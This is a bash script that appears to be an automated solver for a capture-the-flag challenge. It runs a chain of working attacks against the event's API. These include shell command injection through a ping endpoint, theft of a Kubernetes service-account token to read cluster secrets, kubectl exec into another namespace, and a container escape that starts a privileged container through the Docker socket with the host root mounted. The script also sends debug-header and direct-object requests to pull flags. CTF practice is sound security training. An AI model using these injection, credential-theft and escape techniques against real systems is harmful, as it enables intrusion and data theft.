#!/bin/bash

CTF_TOKEN="${CTF_TOKEN:?CTF_TOKEN WITH ADMIN ROLE IS NEEDED}"

curl -s -X POST https://ctf.seoeh.ir/api/diag/ping \
    -H "Content-Type: application/json" \
    -d '{"host":"google.com; cat flag.txt"}' | jq -r '.output'

curl -s https://ctf.seoeh.ir/api/schema/ | grep -o 'HAMAMOOZ{[^}]*}'

curl -s -X 'GET' \
  'https://ctf.seoeh.ir/api/internal/flag' \
  -H 'accept: application/json' \
  -H 'X-Debug-Mode: true' | jq -r '.flag'

curl -s 'https://ctf.seoeh.ir/api/orgs/2/reports/2' | jq -r '.secret_note'

curl -s -X 'POST' \
  'https://ctf.seoeh.ir/api/diag/ping' \
  -H "Content-Type: application/json" \
  -d '{"host": "google.com; cat /opt/.sysdiag-7e3f9a2c4b1d8e5f/flag.txt"}' | jq -r ".output"

curl -s -X POST 'https://ctf.seoeh.ir/api/diag/ping' -H 'Content-Type: application/json' -d '{
    "host": "google.com; curl -sk -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" https://10.96.0.1/api/v1/secrets"
  }' | grep -oP '\\"flag\\"\s*:\s*\\"\K[A-Za-z0-9+/=]+' | base64 -d 

printf '\n'

curl -s -X POST 'https://ctf.seoeh.ir/api/diag/ping' -H 'Content-Type: application/json' -d '{"host": "google.com; curl 10.244.2.2:5000"}' | jq -r '.output' | grep -oP 'HAMAMOOZ{[^}]+\}'


curl -s -X POST 'https://ctf.seoeh.ir/api/diag/ping' -H 'Content-Type: application/json' -d '{
    "host": "google.com; kubectl exec -n escape-zone legacy-worker --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) --server=https://10.96.0.1 --insecure-skip-tls-verify -- cat /host/var/lib/node-data/flag.txt"
  }' | jq -r '.output'


sudo docker pull hub.hamdocker.ir/seoeh/hamamooz_challlenges:backend >/dev/null 2>&1
if [ ! -f image.tar ]; then
    sudo docker save hub.hamdocker.ir/seoeh/hamamooz_challlenges:backend -o image.tar >/dev/null 2>&1
fi
mkdir image >/dev/null 2>&1
sudo tar -xf image.tar -C image >/dev/null 2>&1
cd image/blobs/sha256/
grep -a -oP 'HAMAMOOZ\{[^}]+\}' 8042ae393dc8b7301ef4f2544fad8f596e00d57db61ca968d11d2b3e2e49f586 2>/dev/null

curl -s 'https://ctf.seoeh.ir/admin/dashboard' -H "Cookie: ctf_token=$CTF_TOKEN" | jq -r '.flag'


CONTAINER_ID=$(curl -s -X 'POST' \
  'https://ctf.seoeh.ir/api/diag/ping' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{"host":"google.com; kubectl exec -n escape-zone legacy-worker \\   --token=\"$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" \\   --server=https://10.96.0.1 \\   --insecure-skip-tls-verify \\   -- curl --unix-socket /host/run/docker.sock \\   -X POST http://localhost/containers/create \\   -H '\''Content-Type: application/json'\'' \\   -d '\''{     \"Image\":\"hub.hamdocker.ir/alpine:3.19\",     \"Cmd\":[\"cat\",\"/host/home/ubuntu/flag.txt\"],     \"HostConfig\":{       \"Binds\":[\"/:/host\"],       \"Privileged\":true     }   }'\''"}' | jq -r '.output | fromjson | .Id')

curl -s -o /dev/null -X POST \
  'https://ctf.seoeh.ir/api/diag/ping' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  --data-binary @- <<JSON
{
  "host": "google.com; kubectl exec -n escape-zone legacy-worker --token=\"\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" --server=https://10.96.0.1 --insecure-skip-tls-verify -- curl --unix-socket /host/run/docker.sock -X POST http://localhost/containers/$CONTAINER_ID/start"
}
JSON

RESULT=$(curl -s -X POST \
  'https://ctf.seoeh.ir/api/diag/ping' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  --data-binary @- <<JSON
{
  "host": "google.com; kubectl exec -n escape-zone legacy-worker --token=\"\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" --server=https://10.96.0.1 --insecure-skip-tls-verify -- curl --unix-socket /host/run/docker.sock \"http://localhost/containers/$CONTAINER_ID/logs?stdout=true&stderr=true\""
}
JSON
)

echo "$RESULT" | grep -oP 'HAMAMOOZ{[^}]+\}'